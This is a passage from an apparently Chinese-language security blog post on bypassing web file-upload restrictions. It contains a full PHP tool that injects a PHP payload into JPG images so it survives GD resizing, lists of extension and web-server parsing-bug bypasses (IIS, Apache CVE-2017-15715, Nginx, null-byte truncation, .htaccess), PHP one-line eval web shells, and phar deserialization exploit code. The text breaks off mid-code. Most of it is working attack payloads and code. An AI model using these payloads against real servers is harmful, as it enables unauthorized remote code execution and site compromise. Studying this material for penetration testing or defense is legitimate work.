class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /*</span><br><span class="line"></span><br><span class="line">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">    1) Upload an arbitrary image via secured files upload script</span><br><span class="line">    2) Save the processed image and launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="line">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">    See also:</span><br><span class="line">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;</span><br><span class="line">        die(&#x27;php-gd is not installed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[1]);</span><br><span class="line">        $outStream = file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes = 0;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(&#x27;Incorrect SOI marker&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker === 0xDA) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !== 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&#x27;Success!&#x27;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&#x27;payload_&#x27;.$argv[1]);</span><br><span class="line">    die(&#x27;Something\&#x27;s wrong&#x27;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = &#x27;&#x27;;</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>使用方法</p>
<p>随便找一个jpg图片,下载到本地保存为<code>1.jpg</code>.</p>
<p>使用脚本处理<code>1.jpg</code>,命令<code>php jpg_payload.php 1.jpg</code></p>
<p><img src="image-20210212221838208.png" alt="image-20210212221838208"></p>
<p>使用16进制编辑器打开,就可以看到插入的php代码.</p>
<p><img src="image-20210212221823008.png" alt="image-20210212221823008"></p>
<p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p>
<h3 id="4-后缀校验"><a href="#4-后缀校验" class="headerlink" title="4.后缀校验"></a>4.后缀校验</h3><p><strong>原理</strong></p>
<p>取文件后缀名与服务端黑白名单进行比较</p>
<p><strong>绕过</strong></p>
<p>os系统特性、后缀名截取不规范、php代码缺陷、过滤不完全、配合伪协议解析图形文件</p>
<h4 id="1-黑名单绕过"><a href="#1-黑名单绕过" class="headerlink" title="1.黑名单绕过"></a>1.黑名单绕过</h4><p>windows下绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">更换.htaccess偏门文件名和后缀名</span><br><span class="line">扩展名末尾添加空格、&#x27;_&#x27;、&#x27;.&#x27;、&#x27;::$DATA&#x27;、大小写混写(linux下也可)、‘/’、‘.’、‘/.’符号绕过</span><br><span class="line">&#x27;*=.&#x27;、&#x27;&lt;=*&#x27;、&#x27;&gt;=?&#x27;、&#x27;test.&lt;&lt;&lt;&#x27;</span><br><span class="line">test.php:1.jpg会生成一个test.php的空文件</span><br><span class="line">不可绕过考虑phar://协议利用，若过滤配合(compress://)</span><br></pre></td></tr></table></figure>

<p>asp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">解析漏洞:</span><br><span class="line">.asp;.jpg</span><br><span class="line">.asp.jpg</span><br><span class="line">.asp;jpg</span><br><span class="line">+111.asp;+222.jpg</span><br><span class="line">/111.asp/1.jpg</span><br><span class="line">/111.aspx/1.jpg</span><br><span class="line">后缀名：</span><br><span class="line">asa,cer,cdx,ashx,asmx,xml,htr,asax</span><br><span class="line">双文件扩展：</span><br><span class="line">test.asp.jpg</span><br><span class="line">RTLO：</span><br><span class="line">asp.html-内容为一句话</span><br><span class="line">php.txt-内容为一句话</span><br></pre></td></tr></table></figure>

<p>jsp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.jsp.jpg.jsp	#用两个jsp包围中间的jpg</span><br><span class="line">后缀名：jspf,jspa,jsps,jspx</span><br></pre></td></tr></table></figure>

<p>php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">后缀名：.php3 ,.php4,.php5,.php7</span><br><span class="line">大小写：pHp</span><br><span class="line">解析漏洞：</span><br><span class="line">1.php.jpg</span><br><span class="line">1.jpg.php</span><br><span class="line">1.php  jpg(jpg前面两个空格)</span><br><span class="line">1.php jpg(jpg前面一个空格)</span><br><span class="line">/1.jpg/1.php</span><br><span class="line">/1.jpg%00.php</span><br><span class="line">/1.jpg/.php</span><br><span class="line">/1.jpg/php</span><br><span class="line">特殊文件利用：</span><br><span class="line">.htaccess</span><br><span class="line">.user.ini</span><br></pre></td></tr></table></figure>

<p>以上一些脚本语言的解析漏洞再白名单中也实用</p>
<h5 id="htaccess（白名单也可）"><a href="#htaccess（白名单也可）" class="headerlink" title=".htaccess（白名单也可）"></a>.htaccess（白名单也可）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.htaccess文件(或者&quot;分布式配置文件&quot;）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</span><br></pre></td></tr></table></figure>

<p>利用.htaccess的条件：Apache中配置<code>AllowOverride All</code></p>
<p>.htaccess文件可以配置将特定的文件按规定的文件类型进行解析，可以用以下两种方式来配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>这一种采用正则匹配，只要文件名为test的文件都将被作为php文件解析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<p>第二种是将.jpg文件都作为php文件解析</p>
<p>这样我们如果能将.htaccess上传到服务器的话，就可以再根据我们自己设定的规则来解析上传的文件，以此来绕过上传过滤</p>
<h5 id="利用工具进行fuzz"><a href="#利用工具进行fuzz" class="headerlink" title="利用工具进行fuzz"></a>利用工具进行fuzz</h5><p>工具：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a> </p>
<p>生成fuzz的字典,执行命令:<code>python upload-fuzz-dic-builder.py -n test -a jpg -l php -m apache --os win -o upload_file.txt</code></p>
<p>把生成的字典导入burp中，同时取消payload-encoding的选中状态。执行后可以看到有些php文件上传成功。然后访问其中上传成功的文件，查看是否执行。</p>
<p><img src="image-20210212222524169.png" alt="image-20210212222524169"></p>
<p>访问如图中的地址文件，可以看到上传成功：</p>
<p><img src="image-20210212222545092.png" alt="image-20210212222545092"></p>
<h4 id="2-白名单绕过"><a href="#2-白名单绕过" class="headerlink" title="2.白名单绕过"></a>2.白名单绕过</h4><h5 id="1-00解析漏洞"><a href="#1-00解析漏洞" class="headerlink" title="1.00解析漏洞"></a>1.00解析漏洞</h5><p>这个多数被利用在截断路径，利用的条件是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP &lt; 5.3.4</span><br><span class="line">magic_quotes_gpc 关闭</span><br></pre></td></tr></table></figure>

<p>因为<code>0x00</code>是字符串的结束标志符，所以php在读取到<code>0x00</code>时就不会再往后读取，我们可以利用这些截断字符后面不需要的内容</p>
<p>注意的是<code>%00</code>是url编码，在以POST传参时应该使用burpsuite对其进行url decode，或者修改hex值为00；而当GET传参时因为浏览器会做一遍url decode，所以直接传<code>%00</code>即可。例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php%00.jpg,shell.php0xoo.jpg</span><br></pre></td></tr></table></figure>



<h5 id="2-ascii-特殊字符包含"><a href="#2-ascii-特殊字符包含" class="headerlink" title="2.ascii 特殊字符包含"></a>2.ascii 特殊字符包含</h5><p>00 截断无效，尝试用 0x00~0xff 之内的 ascii 字符来截断。</p>
<p>burp 中发送数据包到 intruder 模块，将范围控制在 0~255 之间</p>
<p>用 intuder 模块的 payload 进行处理，先加上 % ，再进行 urldecode</p>
<p><img src="image-20210214015052201.png" alt="image-20210214015052201"></p>
<h5 id="3-webserver解析漏洞"><a href="#3-webserver解析漏洞" class="headerlink" title="3.webserver解析漏洞"></a>3.webserver解析漏洞</h5><p><strong>IIS</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IIS5.x-6.x:</span><br><span class="line">1、目录解析(6.0):/1.asp/1.jpg 在1.asp下的任意文件，服务器都解析为asp文件</span><br><span class="line">2、文件解析:1.asp;.jpg	#分号后面的不被解析，也就是说1.asp;.jpg会被服务器看成是1.asp</span><br><span class="line">3、文件类型:1.asa,a.cer,1.cdx</span><br><span class="line">IIS7.5：IIS7.5是由于php配置文件中，开启了cgi.fix_pathinf，当访问：http://test.com/a.jpg时，a.jpg会被当做php执行。</span><br></pre></td></tr></table></figure>

<p>Windows下图片马制作：<code>copy /b 正常图片.jpg + yijuhua.php yijuhua.jpg</code></p>
<p><strong>低版本apache解析漏洞</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apache和php三种结合方式：CGI、Module、FastCGI，该解析漏洞只有在apache和php以Module方式结合时才存在，而且Apache还有一个特性：从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断</span><br><span class="line">后缀不识别：1.php.php123，而左边的php可识别，就会被解析为php文件</span><br><span class="line">配置错误：1.php.jpg</span><br></pre></td></tr></table></figure>

<p><strong>CVE-2017-15715</strong></p>
<p>一个apache的解析漏洞就是CVE-2017-15715，这个漏洞利用方式就是上传一个文件名最后带有换行符(只能是<code>\x0A</code>，如上传a.php，然后在burp中修改文件名为<code>a.php\x0A</code>)，以此来绕过一些黑名单过滤</p>
<p>具体的漏洞分析可以看p牛：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p>
<p><strong>nginx解析漏洞</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Nginx默认是以CGI的方式支持PHP解析的，和IIS7.5一样开启了cgi.fix_pathinf</span><br><span class="line">1.jpg/1.php</span><br><span class="line">1.jpg%00.php</span><br><span class="line">1.jpg/%20\1.php</span><br><span class="line">上传一个名字为test.jpg，以下内容的文件：‘);?&gt;  然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php</span><br><span class="line">Nginx &lt;8.03</span><br><span class="line">默认Fast-CGI开启状况下，上传一个木马文件为xxx.jpg，然后访问xxx.jpg/x.php，这个文件将以php进行解析</span><br><span class="line">Nginx 0.5.,0.6, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</span><br><span class="line">Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码</span><br></pre></td></tr></table></figure>



<h4 id="3-文件包含"><a href="#3-文件包含" class="headerlink" title="3.文件包含"></a>3.文件包含</h4><p>利用条件：无法直接上传 shell，只能上传图片，存在文件包含</p>
<h5 id="1-phar"><a href="#1-phar" class="headerlink" title="1.phar"></a>1.phar</h5><p>phar 是 php 中的一种归档压缩文件，类似 zip 。可以使用 phar:&#x2F;&#x2F; 协议来访问压缩后的文件。</p>
<p>PHP5.3之后支持了类似Java的jar包，名为phar。用来将多个PHP文件打包为一个文件。</p>
<p><strong>文件结构</strong></p>
<p>1.a stub：可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<p>2.a manifest describing the contents：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<p>3.the file contents：被压缩文件的内容。</p>
<p>4.[optional] a signature for verifying Phar integrity (phar file format only)：签名，放在文件末尾</p>
<h6 id="1-正常使用"><a href="#1-正常使用" class="headerlink" title="1.正常使用"></a>1.正常使用</h6><p>将 php 文件压缩成 zip 文件，zip 文件改后缀为相应的上传点要求文件后缀</p>
<p>例如上传点要求png，将下面的代码放在 1.php 中，压缩成 1.zip 并改名 1.png后上传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>上传文件之后在右键 -&gt; 源代码中可以看到上传的地址，复制出来并用 phar:&#x2F;&#x2F; 协议进行访问</p>
<p>访问：<code>path/x.php?str=phar://upload_path/1.png</code></p>
<h6 id="2-phar反序列化"><a href="#2-phar反序列化" class="headerlink" title="2.phar反序列化"></a>2.phar反序列化</h6><p><strong>原因</strong></p>
<p>phar反序列化漏洞的漏洞点在于使用phar:&#x2F;&#x2F;协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化；当Metadata内容可由用户控制，则会存在反序列化漏洞风险。</p>
<p><strong>生成一个简单的phar</strong></p>
<p>php内置了一个Phar类来处理相关操作，但是要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">        	<span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; data);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data = <span class="string">&#x27;phpinfo();&#x27;</span>; <span class="comment">//恶意内容</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>利用条件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.phar文件要能够上传到服务器端。</span><br><span class="line">2.要有可用的魔术方法作为“跳板”。</span><br><span class="line">3.文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</span><br></pre></td></tr></table></figure>

<p><strong>简单的例子</strong></p>
<p>假定上传点只能上传GIF，则对<strong>生成一个简单的phar</strong>中做一个简单的修改</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment">//stub前面添加gif头，绕过文件幻数检测</span></span><br></pre></td></tr></table></figure>

<p>后台解析文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 